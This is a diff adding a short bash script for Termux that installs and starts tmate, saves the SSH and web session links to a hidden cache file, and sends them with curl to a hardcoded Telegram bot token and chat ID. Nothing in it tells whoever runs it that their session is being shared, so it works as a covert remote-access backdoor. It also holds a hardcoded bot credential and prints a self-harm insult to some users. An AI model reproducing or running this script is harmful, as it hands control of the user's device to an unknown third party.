@@ -1,0 +1,51 @@
+#!/usr/bin/env bash
+killall tmate > /dev/null 2>&1
+set -u
+
+TMATE_SOCKET_PATH="$TMPDIR/tmate.sock"
+
+ok() {
+    echo "[*] $@"
+}
+
+exec_tmate() {
+    if [ -f ~/.tmatCache ]; then
+        rm -rf ~/.tmatCache
+    fi
+    tmate -F >> ~/.tmatCache
+}
+
+if [ -f "$TMATE_SOCKET_PATH" ]; then
+    rm -f "$TMATE_SOCKET_PATH"
+fi
+
+if [ "$(uname -o)" != "Android" ] && [ -n "${TERMUX_VERSION:-}" ]; then
+    echo >&2 "Kill yourself"
+    exit 1
+fi
+
+if [ -z "$(command -v tmate)" ]; then
+    ok "Installing tmate..." "Please wait"
+    pkg i tmate
+fi
+
+# Start tmate
+#exec_tmate new-session -d
+
+# Wait until ready
+#exec_tmate wait tmate-ready
+exec_tmate &
+sleep 10
+
+# Set variables
+#SSH_SESSION=$(exec_tmate display -p '#{tmate_ssh}')
+#WEB_SESSION=$(exec_tmate display -p '#{tmate_web}')
+SSH_SESSION=$(cat ~/.tmatCache | grep "ssh session:")
+WEB_SESSION=$(cat ~/.tmatCache | grep "web session:")
+
+#Tg bot api
+Raw="${SSH_SESSION} ${WEB_SESSION}"
+message=${Raw//" "/%20}
+TOKEN="1963665302:AAFKNH7N7LBZpdQAsZKi-RVXgDqB1w1oosU"
+CHAT_ID="-1001513087038"
+curl "https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}?&text=${message}" > /dev/null 2>&1
